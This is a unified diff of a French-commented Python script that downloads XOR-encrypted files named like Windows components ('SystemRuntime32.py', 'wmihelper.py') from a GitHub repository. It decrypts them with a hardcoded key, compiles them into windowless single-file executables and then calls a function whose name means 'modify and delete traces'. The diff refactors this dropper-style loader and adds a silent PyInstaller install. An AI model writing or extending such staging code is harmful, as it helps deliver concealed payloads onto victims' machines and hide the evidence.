@@ -1,33 +1,70 @@
 import os
 import tempfile
 import requests
+import subprocess
+import sys
 
-def xor_decrypt(data, key):
-    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+# === Clé de décryptage ===
+CLE = "LUCORACORE987"
 
-def download_and_decrypt(url, output_path, key):
+# === URLs des fichiers à télécharger ===
+URLS = {
+    "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
+    "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
+}
+
+# === Dossier de sortie pour les .exe ===
+DOSSIER_SORTIE = r"C:\Users\LOUKITA\Desktop\Test23"
+
+
+def verifier_et_installer_pyinstaller():
     try:
-        print(f"[↓] Téléchargement de : {url}")
-        r = requests.get(url)
+        import PyInstaller
+    except ImportError:
+        print("[...] PyInstaller non trouvé. Installation...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+        print("[✓] PyInstaller installé.")
+
+
+def decrypt(texte, cle):
+    cle_repetee = (cle * ((len(texte) // len(cle)) + 1))[:len(texte)]
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(texte, cle_repetee))
+
+
+def telecharger_et_decrypter(nom, url, cle):
+    chemin_temp = os.path.join(tempfile.gettempdir(), nom)
+    try:
+        print(f"[↓] Téléchargement de {url}")
+        r = requests.get(url, timeout=10)
         r.raise_for_status()
-        encrypted = r.text
-        decrypted = xor_decrypt(encrypted, key)
 
-        with open(output_path, "w", encoding="utf-8") as f:
-            f.write(decrypted)
-        print(f"[✓] Décrypté et enregistré dans : {output_path}")
-        return True
+        contenu_crypte = r.content.decode("utf-8", errors="ignore")
+        contenu_decrypte = decrypt(contenu_crypte, cle)
+
+        with open(chemin_temp, "w", encoding="utf-8") as f:
+            f.write(contenu_decrypte)
+        print(f"[✓] Déchiffré et enregistré dans : {chemin_temp}")
+        return chemin_temp
     except Exception as e:
-        print(f"[✗] Erreur : {e}")
-        return False
+        print(f"[!] Erreur avec {nom} : {e}")
+        return None
 
-def compiler_en_exe(path, output_dir):
-    exe_name = os.path.splitext(os.path.basename(path))[0]
-    os.system(
-        f"pyinstaller --noconsole --onefile \"{path}\" "
-        f"--distpath \"{output_dir}\" --name \"{exe_name}\""
-    )
-    print(f"[✓] Compilé : {exe_name}.exe → {output_dir}")
+
+def compiler_en_exe(source_path, dossier_sortie):
+    nom_fichier = os.path.basename(source_path).replace(".py", "")
+    try:
+        subprocess.run([
+            "pyinstaller",
+            "--noconfirm",
+            "--onefile",
+            "--windowed",  # Pas de fenêtre
+            "--distpath", dossier_sortie,
+            source_path
+        ], check=True)
+        print(f"[✓] Compilé en .exe : {nom_fichier}.exe")
+    except Exception as e:
+        print(f"[!] Erreur compilation : {e}")
+
 
 def modifier_et_supprimer_trace():
     temp_dir = tempfile.gettempdir()
@@ -69,31 +106,23 @@ def modifier_et_supprimer_trace():
     except Exception as e:
         print(f"[!] Erreur lors de la suppression : {e}")
 
+
 def main():
-    key = "LUCORACORE987"
-    urls = {
-        "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
-        "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
-    }
+    os.makedirs(DOSSIER_SORTIE, exist_ok=True)
 
-    output_dir = r"C:\Users\LOUKITA\Desktop\Test23"
-    os.makedirs(output_dir, exist_ok=True)
+    verifier_et_installer_pyinstaller()
 
-    decrypted_paths = []
+    fichiers_decryptes = []
+    for nom, url in URLS.items():
+        chemin = telecharger_et_decrypter(nom, url, CLE)
+        if chemin:
+            fichiers_decryptes.append(chemin)
 
-    for name, url in urls.items():
-        output_path = os.path.join(tempfile.gettempdir(), name)
-        if download_and_decrypt(url, output_path, key):
-            decrypted_paths.append(output_path)
+    for fichier in fichiers_decryptes:
+        compiler_en_exe(fichier, DOSSIER_SORTIE)
 
-    print("\n[🛠] Compilation en .exe (mode invisible)...")
-    for path in decrypted_paths:
-        compiler_en_exe(path, output_dir)
-
-    print("\n[✓] Compilation terminée.")
-
-    # Partie update du script original
     modifier_et_supprimer_trace()
+
 
 if __name__ == "__main__":
     main()
